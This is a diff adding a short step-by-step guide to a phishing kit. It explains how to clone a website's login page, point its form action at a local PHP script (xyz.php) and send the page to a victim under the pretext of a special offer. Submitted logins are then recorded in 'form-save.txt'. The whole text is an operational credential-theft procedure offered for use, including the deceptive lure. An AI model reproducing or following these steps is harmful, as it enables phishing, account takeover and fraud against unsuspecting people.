@@ -1,0 +1,8 @@
+Steps to Follow
+1)==> First of all extract my all documents onto your device(basically PC).
+2)==> Firstly find a website whose login details you need to extract.
+3)==> Then Just open it's source code ( by clicking Ctrl+U ) And copy the whole source code and paste it into the Main_Tool.php using your favourite text editor ( I am using Atom- A GitHub Project ).
+4)==> Now click Ctrl+F and find in the document for <<<  form action=  >>>.
+5)==> Now repalce text after "=" with "xyz.php". for eg. <form action="example.com"> ===> <form action="xyz.php">.
+6)==> Now just you have to do is to send someone this document and ask him for that some offer is going on if you login through this.
+7)==> Once he logins all his details will be overwritten in 'form-save.txt' document.
